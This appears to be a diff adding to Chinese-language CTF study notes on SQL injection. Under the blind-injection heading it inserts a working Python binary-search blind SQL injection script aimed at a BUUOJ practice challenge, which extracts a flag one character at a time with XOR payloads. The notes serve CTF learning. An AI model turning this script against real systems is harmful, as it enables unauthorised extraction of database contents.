@@ -29,6 +29,39 @@ Information_schema.columns where table_name = ‘a’  //存储了数据库内�
 ```
 
 * ### 盲注
+
+盲注脚本（二分搜索）
+
+```
+import requests
+import time
+
+url = "http://5280dd8d-5fd7-4412-840b-9bdac6ddcb46.node3.buuoj.cn/index.php"
+temp = {"id" : ""}
+flag = ""
+for i in range(1,1000):
+    time.sleep(0.06)
+    low = 32
+    high =128
+    mid = (low+high)//2
+    while(low<high):
+        temp["id"] = "1^" + "(ascii(substr((select(flag)from(flag)),%d,1))>%d)^1" %(i,mid)
+        r = requests.post(url,data=temp)
+        #print(low,high,mid,":")
+        if "Hello" in r.text:
+            low = mid+1
+        else:
+            high = mid
+        mid =(low+high)//2
+    if(mid ==32 or mid ==127):
+        break
+    flag +=chr(mid)
+    print(flag)
+
+
+print("flag=" ,flag)
+```
+
 * ### Bypass
 
 有一些题目中不需要用单引号闭合直接进行执行
